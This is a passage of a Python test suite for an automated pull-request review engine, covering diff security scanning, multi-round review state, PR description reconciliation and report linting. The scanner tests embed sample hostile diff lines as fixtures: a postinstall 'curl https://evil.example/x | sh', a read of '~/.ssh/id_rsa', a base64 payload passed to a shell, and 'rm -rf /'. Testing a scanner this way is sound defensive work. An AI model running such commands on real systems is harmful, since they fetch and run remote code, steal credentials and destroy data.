            "+++ b/src/math.py\n"
            "@@ -10,3 +10,3 @@\n"
            "-    subprocess.run(['rm', '-rf', '/'])\n"
            "-    eval(user_input)\n"
            "+    return x + y\n"
        )
        res = scan_diff_execution_risks(diff)
        self.assertEqual(res["status"], "clean")
        self.assertEqual(res["risk_count"], 0)
        self.assertEqual(res["flagged_files"], [])
        self.assertEqual(res["signals"], [])

    def test_scan_diff_execution_risks_flags_configs_renames_and_code_hazards(self):
        diff = (
            "diff --git a/scripts/ innocent.sh b/.husky/pre-commit\n"
            "similarity index 100%\n"
            "rename from scripts/innocent.sh\n"
            "rename to .husky/pre-commit\n"
            "diff --git a/eslint.config.js b/eslint.config.js\n"
            "--- a/eslint.config.js\n"
            "+++ b/eslint.config.js\n"
            "@@ -1,1 +1,2 @@\n"
            " export default [];\n"
            "+const cp = require('child_process');\n"
            "diff --git a/tests/test_app.py b/tests/test_app.py\n"
            "--- a/tests/test_app.py\n"
            "+++ b/tests/test_app.py\n"
            "@@ -20,1 +20,3 @@\n"
            "+    key = open('~/.ssh/id_rsa').read()\n"
            "+    payload = base64.b64decode('c2g=')\n"
            "+    subprocess.Popen(['sh', '-c', payload])\n"
        )
        res = scan_diff_execution_risks(diff)
        self.assertEqual(res["status"], "flagged")
        self.assertIn(".husky/pre-commit", res["flagged_files"])
        self.assertIn("eslint.config.js", res["flagged_files"])
        self.assertIn("tests/test_app.py", res["flagged_files"])
        self.assertEqual(res["categories"]["build_and_hook_configs"], 2)
        self.assertEqual(res["categories"]["process_and_dynamic_execution"], 2)
        self.assertEqual(res["categories"]["network_and_exfiltration"], 1)
        self.assertEqual(res["categories"]["obfuscation_and_payloads"], 1)

    def test_main_security_scan_standalone_without_pr_arg(self):
        diff = (
            "diff --git a/package.json b/package.json\n"
            "--- a/package.json\n"
            "+++ b/package.json\n"
            "@@ -1,2 +1,3 @@\n"
            " {\n"
            '+  "scripts": {"postinstall": "curl https://evil.example/x | sh"}\n'
            " }\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            diff_file = Path(tmp) / "pr.diff"
            out_file = Path(tmp) / "scan.json"
            diff_file.write_text(diff, encoding="utf-8")
            rc = main(
                [
                    "--security-scan",
                    str(diff_file),
                    "--output-security-scan",
                    str(out_file),
                ]
            )
            self.assertEqual(rc, 0)
            scan = json.loads(out_file.read_text(encoding="utf-8"))
            self.assertEqual(scan["status"], "flagged")
            self.assertIn("package.json", scan["flagged_files"])
            self.assertGreaterEqual(
                scan["categories"].get("build_and_hook_configs", 0), 1
            )
            self.assertGreaterEqual(
                scan["categories"].get("network_and_exfiltration", 0), 1
            )

    @patch("review_engine.fetch_pr_stack", return_value=None)
    @patch("review_engine.run_command")
    @patch("review_engine.get_pr_diff")
    @patch("review_engine.prepare_workspace")
    @patch("review_engine.resolve_pr_coordinates")
    def test_main_prepare_workspace_re_review_archives_prior_state(
        self, mock_coords, mock_prep, mock_diff, mock_run, _mock_stack
    ):
        mock_coords.return_value = {
            "owner": "octocat",
            "repo": "hello-world",
            "pull_number": 42,
            "base_ref": "main",
            "head_sha": "sha_round_1",
            "pr_url": "https://github.com/octocat/hello-world/pull/42",
            "state": "OPEN",
        }
        mock_prep.return_value = ("/tmp/pr-review-r1", True)
        mock_diff.return_value = "diff --git a/a.py b/a.py\n+x = 1\n"
        mock_run.return_value = (0, "sha_round_1", "")

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            coords_file = tmp_path / "pr_coords.json"
            diff_file = tmp_path / "pr.diff"
            ws_file = tmp_path / "workspace_dir.txt"
            blind_file = tmp_path / "blind_description.md"
            results_file = tmp_path / "review_results.json"
            decisions_file = tmp_path / "review_decisions.json"
            meta_file = tmp_path / "pr_meta.json"
            ctx_file = tmp_path / "pr_context.json"

            # Round 1 prepare-workspace
            rc1 = main(
                [
                    "--pr",
                    "42",
                    "--prepare-workspace",
                    "--output-coords",
                    str(coords_file),
                    "--output-diff",
                    str(diff_file),
                    "--output-workspace",
                    str(ws_file),
                ]
            )
            self.assertEqual(rc1, 0)
            coords1 = json.loads(coords_file.read_text(encoding="utf-8"))
            self.assertEqual(coords1["review_round"], 1)
            self.assertNotIn("prev_head_sha", coords1)

            # Simulate Round 1 outputs
            blind_file.write_text(
                "## Summary\nRound 1 blind summary.\n", encoding="utf-8"
            )
            results_file.write_text('{"findings": [{"id": "H1"}]}', encoding="utf-8")
            decisions_file.write_text(
                '{"verdict": "REQUEST_CHANGES"}', encoding="utf-8"
            )

            # Round 2 prepare-workspace after author pushes sha_round_2
            mock_prep.return_value = ("/tmp/pr-review-r2", True)
            mock_diff.return_value = "diff --git a/a.py b/a.py\n+x = 2\n"

            def side_effect_r2(cmd, cwd=None):
                if cmd[:2] == ["git", "rev-parse"]:
                    return 0, "sha_round_2", ""
                if "sha_round_1..sha_round_2" in cmd:
                    return 0, "diff --git a/a.py b/a.py\n-x = 1\n+x = 2\n", ""
                return 0, "", ""

            mock_run.side_effect = side_effect_r2

            rc2 = main(
                [
                    "--pr",
                    "42",
                    "--prepare-workspace",
                    "--output-coords",
                    str(coords_file),
                    "--output-diff",
                    str(diff_file),
                    "--output-workspace",
                    str(ws_file),
                ]
            )
            self.assertEqual(rc2, 0)
            coords2 = json.loads(coords_file.read_text(encoding="utf-8"))
            self.assertEqual(coords2["review_round"], 2)
            self.assertEqual(coords2["prev_head_sha"], "sha_round_1")
            self.assertEqual(coords2["head_sha"], "sha_round_2")
            inc_diff_path = tmp_path / "pr_incremental.diff"
            self.assertEqual(coords2["incremental_diff_file"], str(inc_diff_path))
            self.assertTrue(inc_diff_path.is_file())
            self.assertIn("-x = 1\n+x = 2", inc_diff_path.read_text(encoding="utf-8"))

            # Round 1 blind_description.md was moved to prev_blind_description.md
            self.assertFalse(blind_file.exists())
            self.assertTrue((tmp_path / "prev_blind_description.md").is_file())
            self.assertTrue((tmp_path / "prev_review_results.json").is_file())
            self.assertTrue((tmp_path / "prev_review_decisions.json").is_file())

            with patch("review_engine.fetch_pr_context") as mock_fetch:
                mock_fetch.return_value = (
                    {
                        "owner": "octocat",
                        "repo": "hello-world",
                        "pull_number": 42,
                        "title": "PR 42",
                        "head_sha": "sha_round_2",
                    },
                    {
                        "title": "PR 42",
                        "body": "Body",
                        "comments": [],
                        "reviews": [],
                        "threads": [],
                        "threads_complete": True,
                    },
                )
                # Fails when Stage 1 did not recreate blind_description.md
                rc_missing = main(
                    [
                        "--fetch-context",
                        "--input-coords",
                        str(coords_file),
                        "--require-blind-description",
                        str(blind_file),
                        "--output-meta",
                        str(meta_file),
                        "--output-context",
                        str(ctx_file),
                    ]
                )
                self.assertEqual(rc_missing, 1)
                mock_fetch.assert_not_called()

                # Fails when Stage 1 copies Round 1's blind description after HEAD moved
                blind_file.write_text(
                    "## Summary\nRound 1 blind summary.\n", encoding="utf-8"
                )
                rc_stale = main(
                    [
                        "--fetch-context",
                        "--input-coords",
                        str(coords_file),
                        "--require-blind-description",
                        str(blind_file),
                        "--output-meta",
                        str(meta_file),
                        "--output-context",
                        str(ctx_file),
                    ]
                )
                self.assertEqual(rc_stale, 1)
                mock_fetch.assert_not_called()

                # Succeeds once a fresh Round 2 blind description is written
                blind_file.write_text(
                    "## Summary\nRound 2 updated blind summary.\n", encoding="utf-8"
                )
                rc_fresh = main(
                    [
                        "--fetch-context",
                        "--input-coords",
                        str(coords_file),
                        "--require-blind-description",
                        str(blind_file),
                        "--output-meta",
                        str(meta_file),
                        "--output-context",
                        str(ctx_file),
                    ]
                )
                self.assertEqual(rc_fresh, 0)
                mock_fetch.assert_called_once()

    @patch("review_engine.fetch_pr_stack", return_value=None)
    @patch("review_engine.run_command")
    @patch("review_engine.get_pr_diff")
    @patch("review_engine.prepare_workspace")
    @patch("review_engine.resolve_pr_coordinates")
    def test_main_prepare_workspace_re_review_handles_unreachable_prev_sha_gracefully(
        self, mock_coords, mock_prep, mock_diff, mock_run, _mock_stack
    ):
        mock_coords.return_value = {
            "owner": "octocat",
            "repo": "hello-world",
            "pull_number": 42,
            "base_ref": "main",
            "head_sha": "sha_force_pushed",
            "pr_url": "https://github.com/octocat/hello-world/pull/42",
            "state": "OPEN",
        }
        mock_prep.return_value = ("/tmp/pr-review-fp", True)
        mock_diff.return_value = "diff --git a/a.py b/a.py\n+x = 3\n"

        def side_effect_fp(cmd, cwd=None):
            if cmd[:2] == ["git", "rev-parse"]:
                return 0, "sha_force_pushed", ""
            return 128, "", "fatal: bad object sha_old"

        mock_run.side_effect = side_effect_fp

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            coords_file = tmp_path / "pr_coords.json"
            diff_file = tmp_path / "pr.diff"
            coords_file.write_text(
                json.dumps(
                    {
                        "owner": "octocat",
                        "repo": "hello-world",
                        "pull_number": 42,
                        "head_sha": "sha_old",
                        "review_round": 1,
                    }
                ),
                encoding="utf-8",
            )
            rc = main(
                [
                    "--pr",
                    "42",
                    "--prepare-workspace",
                    "--output-coords",
                    str(coords_file),
                    "--output-diff",
                    str(diff_file),
                ]
            )
            self.assertEqual(rc, 0)
            coords = json.loads(coords_file.read_text(encoding="utf-8"))
            self.assertEqual(coords["review_round"], 2)
            self.assertEqual(coords["prev_head_sha"], "sha_old")
            self.assertNotIn("incremental_diff_file", coords)

    @patch("review_engine.run_command")
    def test_get_incremental_diff_filters_to_pr_paths_on_rebase(self, mock_run):
        import review_engine

        recorded_cmds: list[list[str]] = []
        fetched = {"done": False}

        def side_effect(cmd, cwd=None):
            recorded_cmds.append(list(cmd))
            if "--name-only" in cmd and "origin/main...sha_round_1" in cmd:
                if not fetched["done"]:
                    return 128, "", "fatal: bad object sha_round_1"
                return 0, "src/reverted_in_r2.py\nsrc/kept.py\n", ""
            if cmd[:4] == ["git", "fetch", "--no-tags", "origin"]:
                fetched["done"] = True
                return 0, "", ""
            if "sha_round_1..sha_round_2" in cmd:
                return 0, "diff --git a/src/kept.py b/src/kept.py\n+x = 2\n", ""
            return 0, "", ""

        mock_run.side_effect = side_effect
        r2_diff = (
            "diff --git a/src/kept.py b/src/kept.py\n"
            "--- a/src/kept.py\n"
            "+++ b/src/kept.py\n"
            "@@ -1 +1 @@\n"
            "-x = 1\n"
            "+x = 2\n"
            "diff --git a/src/added_in_r2.py b/src/added_in_r2.py\n"
            "--- /dev/null\n"
            "+++ b/src/added_in_r2.py\n"
            "@@ -0,0 +1 @@\n"
            "+y = 1\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            diff_file = tmp_path / "pr.diff"
            coords = {"base_ref": "main", "head_sha": "sha_round_2"}
            review_engine._write_incremental_diff_if_needed(
                "/tmp/pr-review-rebase",
                coords,
                "sha_round_1",
                str(diff_file),
                r2_diff,
            )
            inc_path = tmp_path / "pr_incremental.diff"
            self.assertTrue(inc_path.is_file())
            self.assertEqual(coords["incremental_diff_file"], str(inc_path))

        diff_calls = [c for c in recorded_cmds if "sha_round_1..sha_round_2" in c]
        self.assertEqual(len(diff_calls), 1)
        self.assertEqual(
            diff_calls[0][-4:],
            ["--", "src/added_in_r2.py", "src/kept.py", "src/reverted_in_r2.py"],
        )


_SAMPLE_BLIND_MD = (
    "## Summary\n"
    "Adds retry backoff to the HTTP client.\n\n"
    "## Inferred Purpose\n"
    "Prevent transient 503 responses from failing requests immediately.\n\n"
    "## Quality Assessment\n"
    "Focused change with unit test coverage.\n\n"
    "## Security & Execution Gate\n"
    "- **Gate Verdict**: `SAFE_FOR_LOCAL_EXECUTION`\n"
    "- **Static Pre-Scan**: `clean`\n\n"
    "## Changes\n"
    "- **`src/client.py`**: Adds exponential backoff loop.\n\n"
    "## Reviewer Focus & Risks\n"
    "- Verify max retry cap under timeout.\n"
)

_CLEAN_REPORT_MD = """# Code Review Report

## Summary
Adds retry backoff to the HTTP client. Ring Classification: Ring 1. Review Level: standard. Flags: `--json`. Citation audit: 1 checked, 0 dropped. Verdict: Minor Revisions Needed.

## Structural Assessment
- **Implementer**: Clean retry loop structure.
- **Tester / Verifier**: Covers backoff timing.

## Review Comments

### M1. Retry loop ignores zero max_retries
- **File**: `src/client.py`
- **Line**: `11-12`
- **Severity**: `medium`
- **Category**: `correctness`
- **Evidence**: `Read - src/client.py:11-12 shows range(max_retries) skipped when negative`
- **Body**: Negative `max_retries` skips the initial attempt and returns `None` without sending the request.
- **Why**: Callers passing `-1` receive `None` instead of a response or error.
- **Suggestion**:
```python
for attempt in range(max(1, max_retries)):
```

## Questions

### Q1. Should 429 responses use the Retry-After header?
- **File**: `src/client.py`
- **Line**: `12`
- **Evidence**: `Speculation - unclear whether upstream sets Retry-After`
- **Why**: Fixed backoff can retry too early when the server specifies a longer delay.
- **To settle**: Check gateway rate-limit headers in `src/gateway.py`.

## Checked and Found Clean
- Timeout propagation in `src/client.py`: Read - timeout passed to transport call
"""


class TestReconcileAndFinalize(unittest.TestCase):
    def test_reconcile_pr_description_splices_partial_and_preserves_sections(self):
        self.assertEqual(ALIGNMENT_HEADINGS["PARTIAL"], "Partial Divergence")
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            blind_file = tmp_path / "blind_description.md"
            rec_file = tmp_path / "intent_reconciliation.json"
            out_file = tmp_path / "pr_description.md"

            blind_file.write_text(_SAMPLE_BLIND_MD, encoding="utf-8")
            expected_sha = hashlib.sha256(_SAMPLE_BLIND_MD.encode("utf-8")).hexdigest()
            rec_file.write_text(
                json.dumps(
                    {
                        "alignment": "PARTIAL",
                        "callouts": [
                            {
                                "section": "Summary",
                                "kind": "NOTE",
                                "text": "Author notes this unblocks issue #3810.",
                            },
                            {
                                "section": "Changes",
                                "kind": "WARNING",
                                "text": "Default timeout also changed from 30s to 5s.",
                            },
                        ],
                        "stack_markdown": "## Stack Context\n\nStack #10 (2 PRs on `main`), reviewing 1 of 2.",
                        "prior_resolution_markdown": "Compared Round 1 against Round 2.",
                    }
                ),
                encoding="utf-8",
            )

            reconcile_pr_description(
                blind_file, rec_file, out_file, expected_blind_sha256=expected_sha
            )
            output = out_file.read_text(encoding="utf-8")
            self.assertTrue(
                output.startswith("## Intent Alignment: Partial Divergence\n\n")
            )
            self.assertEqual(output.count("## Stack Context"), 1)
            self.assertEqual(output.count("## Prior Review Resolution"), 1)
            self.assertLess(
                output.index("## Intent Alignment: Partial Divergence"),
                output.index("## Stack Context"),
            )
            self.assertLess(
                output.index("## Stack Context"),
                output.index("## Prior Review Resolution"),
            )
            for section_block in _SAMPLE_BLIND_MD.strip().split("\n\n"):
                self.assertIn(section_block, output)
            self.assertIn(
                "## Summary\nAdds retry backoff to the HTTP client.\n\n"
                "> [!NOTE]\n> Author notes this unblocks issue #3810.",
                output,
            )
            self.assertIn(
                "> [!WARNING]\n> Default timeout also changed from 30s to 5s.",
                output,
            )

    def test_reconcile_pr_description_rejects_unknown_alignment_section_kind_or_hash(
        self,
    ):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            blind_file = tmp_path / "blind_description.md"
            rec_file = tmp_path / "intent_reconciliation.json"
            out_file = tmp_path / "pr_description.md"
            ctx_file = tmp_path / "pr_context.json"
            blind_file.write_text(_SAMPLE_BLIND_MD, encoding="utf-8")

            # Unknown alignment raises ValueError
            rec_file.write_text(
                json.dumps({"alignment": "BOGUS", "callouts": []}), encoding="utf-8"
            )
            with self.assertRaises(ValueError):
                reconcile_pr_description(blind_file, rec_file, out_file)

            # Unknown section raises ValueError
            rec_file.write_text(
                json.dumps(
                    {
                        "alignment": "MATCHES",
                        "callouts": [
                            {
                                "section": "Nonexistent Heading",
                                "kind": "NOTE",
                                "text": "Context.",
                            }
                        ],
                    }
                ),
                encoding="utf-8",
            )
            with self.assertRaises(ValueError):
                reconcile_pr_description(blind_file, rec_file, out_file)

            # Unknown callout kind raises ValueError
            rec_file.write_text(
                json.dumps(
                    {
                        "alignment": "MATCHES",
                        "callouts": [
                            {
                                "section": "Summary",
                                "kind": "CAUTION",
                                "text": "Bad kind.",
                            }
                        ],
                    }
                ),
                encoding="utf-8",
            )
            with self.assertRaises(ValueError):
                reconcile_pr_description(blind_file, rec_file, out_file)

            # Hash mismatch via --context exits 1
            rec_file.write_text(
                json.dumps({"alignment": "MATCHES", "callouts": []}), encoding="utf-8"
            )
            ctx_file.write_text(
                json.dumps({"blind_sha256": "0" * 64}), encoding="utf-8"
            )
            rc = main(
                [
                    "--reconcile-description",
                    "--blind-description",
                    str(blind_file),
                    "--reconciliation",
                    str(rec_file),
                    "--output-description",
                    str(out_file),
                    "--context",
                    str(ctx_file),
                ]
            )
            self.assertEqual(rc, 1)

    @patch("review_engine.fetch_pr_stack", return_value=None)
    @patch("review_engine.fetch_pr_context")
    @patch("review_engine.run_command", return_value=(0, "sha_r2", ""))
    @patch(
        "review_engine.get_pr_diff", return_value="diff --git a/a.py b/a.py\n+x = 2\n"
    )
    @patch("review_engine.prepare_workspace", return_value=("/tmp/pr-review-r2", True))
    @patch("review_engine.resolve_pr_coordinates")
    def test_round_2_fetch_context_produces_matching_blind_hash(
        self, mock_coords, _prep, _diff, _run, mock_fetch, _stack
    ):
        mock_coords.return_value = {
            "owner": "octocat",
            "repo": "hello-world",
            "pull_number": 42,
            "base_ref": "main",
            "head_sha": "sha_r2",
            "pr_url": "https://github.com/octocat/hello-world/pull/42",
            "state": "OPEN",
        }
        mock_fetch.return_value = (
            {
                "owner": "octocat",
                "repo": "hello-world",
                "pull_number": 42,
                "title": "T",
                "head_sha": "sha_r2",
            },
            {
                "title": "T",
                "body": "B",
                "comments": [],
                "reviews": [],
                "threads": [],
                "threads_complete": True,
            },
        )

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            coords_file = tmp_path / "pr_coords.json"
            diff_file = tmp_path / "pr.diff"
            blind_file = tmp_path / "blind_description.md"
            meta_file = tmp_path / "pr_meta.json"
            ctx_file = tmp_path / "pr_context.json"
            rec_file = tmp_path / "intent_reconciliation.json"
            out_desc = tmp_path / "pr_description.md"

            # Seed Round 1 state
            coords_file.write_text(
                json.dumps(
                    {
                        "owner": "octocat",
                        "repo": "hello-world",
                        "pull_number": 42,
                        "head_sha": "sha_r1",
                        "review_round": 1,
                    }
                ),
                encoding="utf-8",
            )
            blind_file.write_text("## Summary\nRound 1 blind text.\n", encoding="utf-8")

            # Round 2 --prepare-workspace archives Round 1 blind file
            rc_prep = main(
                [
                    "--pr",
                    "42",
                    "--prepare-workspace",
                    "--output-coords",
                    str(coords_file),
                    "--output-diff",
                    str(diff_file),
                ]
            )
            self.assertEqual(rc_prep, 0)
            self.assertFalse(blind_file.exists())
            self.assertTrue((tmp_path / "prev_blind_description.md").is_file())

            # Write Round 2 blind file and run --fetch-context
            r2_blind_text = "## Summary\nRound 2 fresh blind description.\n"
            blind_file.write_text(r2_blind_text, encoding="utf-8")
            rc_fetch = main(
                [
                    "--fetch-context",
                    "--input-coords",
                    str(coords_file),
                    "--require-blind-description",
                    str(blind_file),
                    "--output-meta",
                    str(meta_file),
                    "--output-context",
                    str(ctx_file),
                ]
            )
            self.assertEqual(rc_fetch, 0)
            ctx_data = json.loads(ctx_file.read_text(encoding="utf-8"))
            self.assertEqual(
                ctx_data["blind_sha256"],
                hashlib.sha256(r2_blind_text.encode("utf-8")).hexdigest(),
            )

            # --reconcile-description succeeds with Round 2 context hash
            rec_file.write_text(
                json.dumps({"alignment": "MATCHES", "callouts": []}), encoding="utf-8"
            )
            rc_rec = main(
                [
                    "--reconcile-description",
                    "--blind-description",
                    str(blind_file),
                    "--reconciliation",
                    str(rec_file),
                    "--output-description",
                    str(out_desc),
                    "--context",
                    str(ctx_file),
                ]
            )
            self.assertEqual(rc_rec, 0)
            self.assertIn(
                "## Intent Alignment: Matches Stated Purpose",
                out_desc.read_text(encoding="utf-8"),
            )

    def test_finalize_review_clean_fixture_and_idempotent_normalization(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            repo_dir = tmp_path / "repo"
            (repo_dir / "src").mkdir(parents=True)
            (repo_dir / "src" / "client.py").write_text(
                "\n".join([f"line_{i} = {i}" for i in range(1, 20)]) + "\n",
                encoding="utf-8",
            )
            report_file = tmp_path / "review_results.md"
            diff_file = tmp_path / "pr.diff"
            meta_file = tmp_path / "pr_meta.json"
            out_results = tmp_path / "review_results.json"
            out_findings = tmp_path / "review_findings.json"

            report_file.write_text(_CLEAN_REPORT_MD, encoding="utf-8")
            diff_file.write_text(
                "diff --git a/src/client.py b/src/client.py\n"
                "--- a/src/client.py\n"
                "+++ b/src/client.py\n"
                "@@ -10,0 +11,3 @@\n"
                "+line_11 = 11\n"
                "+line_12 = 12\n"
                "+line_13 = 13\n",
                encoding="utf-8",
            )
            meta_file.write_text(
                json.dumps(
                    {
                        "owner": "octocat",
                        "repo": "hello-world",
                        "pull_number": 42,
                        "title": "feat: add retry",
                        "head_sha": "abc1234",
                    }
                ),
                encoding="utf-8",
            )

            rc = main(
                [
                    "--finalize-review",
                    "--report-md",
                    str(report_file),
                    "--diff",
                    str(diff_file),
                    "--meta-file",
                    str(meta_file),
                    "--repo-dir",
                    str(repo_dir),
                    "--output-results",
                    str(out_results),
                    "--output-findings",
                    str(out_findings),
                ]
            )
            self.assertEqual(rc, 0)
            self.assertTrue(out_results.is_file())
            self.assertTrue(out_findings.is_file())

            results_data = json.loads(out_results.read_text(encoding="utf-8"))
            findings_data = json.loads(out_findings.read_text(encoding="utf-8"))
            self.assertEqual(
                normalize_findings_payload(normalize_findings_payload(results_data)),
                normalize_findings_payload(results_data),
            )
            self.assertEqual(
                normalize_findings_payload(normalize_findings_payload(findings_data)),
                normalize_findings_payload(findings_data),
            )
            self.assertEqual(findings_data["pr_metadata"]["pull_number"], 42)
            self.assertEqual(len(findings_data["findings"]), 2)
            self.assertTrue(findings_data["findings"][0]["is_diff_hunk"])
            self.assertEqual(findings_data["findings"][1]["severity"], "question")

    def test_finalize_review_forty_word_sentence_exits_one_and_prints_fix(self):
        forty_word_sentence = (
            "When the client receives a retryable status code from the upstream "
            "gateway during a burst of concurrent requests, the backoff counter "
            "resets before the sleep timer completes and causes every worker "
            "thread to hammer the endpoint without waiting for recovery."
        )
        bad_report = _CLEAN_REPORT_MD.replace(
            "Negative `max_retries` skips the initial attempt and returns `None` without sending the request.",
            forty_word_sentence,
        )
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            report_file = tmp_path / "review_results.md"
            diff_file = tmp_path / "pr.diff"
            meta_file = tmp_path / "pr_meta.json"
            out_results = tmp_path / "review_results.json"
            out_findings = tmp_path / "review_findings.json"

            report_file.write_text(bad_report, encoding="utf-8")
            diff_file.write_text("diff --git a/a.py b/a.py\n", encoding="utf-8")
            meta_file.write_text("{}", encoding="utf-8")

            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = finalize_review(
                    report_file,
                    diff_file,
                    meta_file,
                    None,
                    out_results,
                    out_findings,
                )
            output = buf.getvalue()
            self.assertEqual(rc, 1)
            self.assertIn("comment-sentence-length", output)
            self.assertIn("Fix:", output)
            self.assertFalse(out_results.exists())
            self.assertFalse(out_findings.exists())

    def test_finalize_review_uses_pr_comment_profile_caps(self):
        # 20 words per sentence * 5 sentences = 100 words in Body, plus 10 words in Why = 110 words (6 sentences).
        twenty_word_sentence = (
            "The cache returns stale rows after the second retry because the "
            "eviction timer never resets on writes from the worker."
        )
        body_110 = " ".join([twenty_word_sentence] * 5)
        report_110 = _CLEAN_REPORT_MD.replace(
            "Negative `max_retries` skips the initial attempt and returns `None` without sending the request.",
            body_110,
        )
        # 24 words per sentence * 5 sentences = 120 words in Body, plus 10 words in Why = 130 words (6 sentences).
        twenty_four_word_sentence = (
            "The local cache returns stale rows after the second retry attempt "
            "because the background eviction timer never resets on fresh writes "
            "from the worker."
        )
        body_130 = " ".join(
            [
                twenty_four_word_word
                for twenty_four_word_word in [twenty_four_word_sentence] * 5
            ]
        )
        report_130 = _CLEAN_REPORT_MD.replace(
            "Negative `max_retries` skips the initial attempt and returns `None` without sending the request.",
            body_130,
        )

        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            report_file = tmp_path / "review_results.md"
            diff_file = tmp_path / "pr.diff"
            meta_file = tmp_path / "pr_meta.json"
            out_results = tmp_path / "review_results.json"
            out_findings = tmp_path / "review_findings.json"

            diff_file.write_text(
                "diff --git a/src/client.py b/src/client.py\n", encoding="utf-8"
            )
            meta_file.write_text(
                json.dumps(
                    {"owner": "o", "repo": "r", "pull_number": 1, "head_sha": "abc"}
                ),
                encoding="utf-8",
            )

            report_file.write_text(report_110, encoding="utf-8")
            rc_ok = finalize_review(
                report_file, diff_file, meta_file, None, out_results, out_findings
            )
            self.assertEqual(rc_ok, 0)
            self.assertTrue(out_results.is_file())
            self.assertTrue(out_findings.is_file())
            out_results.unlink()
            out_findings.unlink()

            report_file.write_text(report_130, encoding="utf-8")
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc_bad = finalize_review(
                    report_file, diff_file, meta_file, None, out_results, out_findings
                )
            output = buf.getvalue()
            self.assertEqual(rc_bad, 1)
            self.assertIn("comment-prose-length", output)
            self.assertIn("120 words and 6 sentences", output)
            self.assertFalse(out_results.exists())
            self.assertFalse(out_findings.exists())


_PREP_DIFF = (
    "diff --git a/src/app.py b/src/app.py\n"
    "--- a/src/app.py\n"
    "+++ b/src/app.py\n"
    "@@ -1,0 +1,2 @@\n"
    "+x = compute(1)\n"
    "+y = compute(2)\n"
    "diff --git a/package-lock.json b/package-lock.json\n"
    "--- a/package-lock.json\n"
    "+++ b/package-lock.json\n"
    "@@ -1,0 +1,2 @@\n"
    '+  "a": "1",\n'
    '+  "b": "2",\n'
)


class TestPrepareCodeReview(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.repo = self.tmp / "checkout"
        (self.repo / "src").mkdir(parents=True)
        (self.repo / "src" / "app.py").write_text("x = 1\n", encoding="utf-8")
        self.diff = self.tmp / "pr.diff"
        self.diff.write_text(_PREP_DIFF, encoding="utf-8")

    def tearDown(self):
        self._tmp.cleanup()

    def _run(self, which_result):
        import shutil as _shutil

        coords = {"base_ref": "", "pull_number": 7}
        with (
            patch("review_engine.shutil.which", return_value=which_result),
            patch("review_engine._run_packrat_context", return_value=None),
        ):
            result = prepare_code_review(coords, self.diff, self.repo, self.tmp)
        self.addCleanup(_shutil.rmtree, result["diff_dir"], True)
        return result

    def test_classification_and_staging_without_duckdb(self):
        before = self.diff.read_bytes()
        result = self._run(None)
        self.assertEqual(self.diff.read_bytes(), before)
        substantive = result["classification"]["substantive"]
        self.assertEqual(substantive["substantive_lines"], 2)
        self.assertEqual(
            substantive["excluded_files"], {"package-lock.json": "lockfile"}
        )
        manifest = Path(result["diff_dir"]) / "manifest.json"
        self.assertTrue(manifest.is_file())
        staged = json.loads(manifest.read_text(encoding="utf-8"))
        staged_files = {f for chunk in staged["chunks"] for f in chunk["files"]}
        self.assertIn("package-lock.json", staged_files)
        self.assertIsNone(result["entity_churn"])
        self.assertIsNone(result["signature_drift"])
        self.assertIn(
            "duckdb not installed; churn and drift skipped", result["warnings"]
        )
        self.assertIn("packrat_context.py unavailable or failed", result["warnings"])

    def test_stage_failure_cleans_up_temp_diff_dir(self):
        created_dirs: list[Path] = []
        real_mkdtemp = tempfile.mkdtemp

        def _track_mkdtemp(*args, **kwargs):
            d = real_mkdtemp(*args, **kwargs)
            created_dirs.append(Path(d))
            return d

        with (
            patch("review_engine.tempfile.mkdtemp", side_effect=_track_mkdtemp),
            patch("review_engine._stage_diff_for_review", return_value="boom"),
            patch("review_engine._run_packrat_context", return_value=None),
        ):
            result = prepare_code_review(
                {"base_ref": "", "pull_number": 7}, self.diff, self.repo, self.tmp
            )
        self.assertIsNone(result["diff_dir"])
        self.assertEqual(len(created_dirs), 1)
        self.assertFalse(created_dirs[0].exists())
        self.assertIn("stage_diffs.py failed: boom", result["warnings"])

    def test_fallback_fix_hints_match_lint_review_rules(self):
        import lint_review
        import review_engine

        self.assertEqual(
            review_engine._FALLBACK_FIX_HINTS, dict(lint_review._FIX_HINTS)
        )

    def test_reconcile_places_blind_preamble_before_stack_and_prior_blocks(self):
        from review_engine import reconcile_pr_description

        blind = self.tmp / "blind.md"
        rec = self.tmp / "rec.json"
        out = self.tmp / "pr_desc.md"
        blind.write_text(
            "Intro preamble paragraph.\n\n## Summary\nBody text.\n",
            encoding="utf-8",
        )
        rec.write_text(
            json.dumps(
                {
                    "alignment": "MATCHES",
                    "stack_markdown": "Stack table.",
                    "prior_resolution_markdown": "Prior table.",
                    "callouts": [],
                }
            ),
            encoding="utf-8",
        )
        reconcile_pr_description(blind, rec, out)
        rendered = out.read_text(encoding="utf-8")
        self.assertLess(
            rendered.index("Intro preamble paragraph."),
            rendered.index("## Stack Context"),
        )
        self.assertLess(
            rendered.index("## Stack Context"),
            rendered.index("## Prior Review Resolution"),
        )

    def test_cli_stores_code_review_prep_in_context(self):
        coords_file = self.tmp / "pr_coords.json"
        coords_file.write_text(
            json.dumps(
                {"owner": "o", "repo": "r", "pull_number": 7, "head_sha": "abc"}
            ),
            encoding="utf-8",
        )
        (self.tmp / "workspace_dir.txt").write_text(str(self.repo), encoding="utf-8")
        blind = self.tmp / "blind_description.md"
        blind.write_text("## Summary\nAdds two values.\n", encoding="utf-8")
        out_context = self.tmp / "pr_context.json"
        sentinel = {"warnings": [], "classification": {"ring": {}}}
        with (
            patch(
                "review_engine.fetch_pr_context",
                return_value=({"head_sha": "abc", "base_ref": "main"}, {}),
            ),
            patch("review_engine.fetch_pr_stack", return_value=None),
            patch("review_engine.prepare_code_review", return_value=sentinel) as prep,
